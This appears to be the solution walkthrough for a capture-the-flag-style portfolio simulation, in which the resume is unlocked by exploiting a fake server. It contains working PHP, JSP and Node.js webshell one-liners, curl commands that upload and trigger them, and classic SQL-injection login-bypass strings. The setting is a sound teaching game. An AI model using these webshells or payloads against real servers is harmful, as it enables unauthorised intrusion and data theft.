# How to Find the Resume (Intended Solution)

This document describes the **intended paths** to reveal GyeongHo Kim's resume in the portfolio simulation. Multiple paths lead to the same destination.

## Prerequisites

- You have booted the desktop, (optionally) seen the mission briefing, and logged in as **visitor**.
- **Path A (Webshell):** Terminal and Text Editor (or echo) for creating/uploading a script.
- **Path B (SQL injection):** Browser app (and optionally Terminal for discovery).

---

## Path A: Webshell (file upload + RCE)

### Step-by-step

### 1. Discover the network

In the terminal:

```bash
arp -a
```

Note the other host on the subnet (e.g. `192.168.1.20`).

### 2. Scan for services

```bash
nmap -sV 192.168.1.20
```

You should see **port 8080** open with an HTTP service (e.g. Apache). Optionally use:

```bash
nmap --script http-enum 192.168.1.20
```

to discover endpoints like `/api/upload`, `/api/files`.

### 3. Create a webshell

The server accepts file uploads without validating file extensions. You can use **PHP**, **JSP (Java)**, or **JavaScript** (Node.js). The script must run a command passed in the `cmd` query parameter (e.g. `?cmd=whoami`).

**Option A – PHP (Text Editor)**

- Run: `edit shell.php`
- In the text editor, type: `<?php system($_GET['cmd']); ?>`
- Save with **Ctrl+S**

**Option B – PHP (echo)**

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

**Option C – JavaScript (Node.js-style)**

- Run: `edit shell.js`
- In the text editor, type a script that uses `child_process` (e.g. `execSync`). The server treats it as a webshell and passes `?cmd=...` to the simulated runner. Example:

```javascript
const { execSync } = require("child_process");
// Server injects cmd from ?cmd=... when you request this file
```

- Save with **Ctrl+S**

**Option D – JSP (Java / Tomcat)**

- Run: `edit shell.jsp`
- In the text editor, type a JSP that runs a command from the request parameter (classic Tomcat/Java webshell). Example:

```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

- Save with **Ctrl+S**

### 4. Upload the webshell

```bash
# PHP, JSP, or JavaScript – use the filename you created
curl -X POST -F "file=@shell.php" http://192.168.1.20:8080/api/upload
# or: file=@shell.jsp   or: file=@shell.js
```

The server stores the file under `/var/www/uploads/` (simulated).

### 5. Execute a command that reveals the resume

Request the uploaded script with a command that reads the resume:

```bash
# Use the same filename and extension you uploaded (e.g. shell.php, shell.jsp, shell.js)
curl "http://192.168.1.20:8080/uploads/shell.php?cmd=cat%20/resume"
```

When the server processes `cmd=cat /resume` (or equivalent), it triggers the resume unlock. The **Resume viewer** overlay opens on the desktop.

---

## Path B: SQL injection (login bypass)

The same host (`192.168.1.20:8080`) serves a **login page**. The login form is vulnerable to SQL injection: you can bypass authentication and be treated as an admin, then open the target user’s resume from the user list.

### Step-by-step

1. **Open the Browser**  
   From the desktop or the **Activities** menu, open **Browser**. It loads `http://192.168.1.20:8080/login` (fixed address).

2. **Submit a SQL injection payload on the login form**  
   In the **Username** (or **Password**) field, enter a classic SQLi payload so the backend condition is always true, for example:
   - `' OR '1'='1`
   - `" OR "1"="1`
   - `' OR 1=1--`
   - `admin'--`  
   The other field can be anything. Click **Sign in**.

3. **Use the user list**  
   After a successful bypass, you are “Logged in as admin” and see a **user list**: `admin`, `gyeonghokim`.

4. **Open the resume**  
   Click **gyeonghokim** in the list. The **Resume viewer** overlay opens with GyeongHo Kim’s resume.  
   (Clicking **admin** only shows “No resume for this user.”)

### Why this works (conceptually)

- The app builds a login query from your input. With a payload like `' OR '1'='1`, the condition becomes always true, so the server treats you as authenticated (e.g. first user / admin).
- You are then shown an internal “user list” and can choose **gyeonghokim** to view that profile’s resume.

---

## Summary

| Path | Steps |
|------|--------|
| **A – Webshell** | `arp -a` → `nmap -sV <ip>` → create `shell.php` / `shell.jsp` / `shell.js` → `curl -X POST -F "file=@shell.xxx"` to `/api/upload` → `curl "http://<ip>:8080/uploads/shell.xxx?cmd=cat%20/resume"` → Resume viewer opens |
| **B – SQL injection** | Open **Browser** → at `http://192.168.1.20:8080/login` enter e.g. `' OR '1'='1` in username → Sign in → click **gyeonghokim** in the user list → Resume viewer opens |

For more context, see the project [README](README.md).
